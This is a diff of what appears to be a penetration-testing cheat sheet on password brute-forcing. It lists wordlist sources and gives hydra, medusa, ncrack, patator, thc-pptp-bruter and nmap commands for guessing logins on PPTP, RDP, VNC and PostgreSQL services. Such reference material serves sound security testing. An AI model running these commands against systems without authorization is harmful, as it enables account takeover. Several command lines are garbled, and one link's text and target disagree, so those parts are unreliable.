@@ -53,7 +53,7 @@ python3 cupp.py -h
 * \*\*\*\*[**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)\*\*\*\*
 * \*\*\*\*[**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)\*\*\*\*
 * \*\*\*\*[**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)\*\*\*\*
-* \*\*\*\*[**https://github.com/google/fuzzing/tree/master/dictionaries**](%20https://github.com/google/fuzzing/tree/master/dictionaries)\*\*\*\*
+* \*\*\*\*[**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/binobe/hacktricks/tree/a14bc076b80ebd26ed7ca80374eac97d2a0b6ead/google/fuzzing/tree/master/dictionaries/README.md)\*\*\*\*
 * \*\*\*\*[**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)\*\*\*\*
 
 ## Services
@@ -266,7 +266,7 @@ sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
 
-### RDP 
+### RDP
 
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
@@ -367,9 +367,9 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
 
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
-medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
+medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
 ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
-patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
+patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
 ```
 
@@ -561,6 +561,4 @@ Cracking Common Application Hashes
  1400 | SHA-256                                          | Raw Hash
  1700 | SHA-512                                          | Raw Hash
 ```
-
-
 
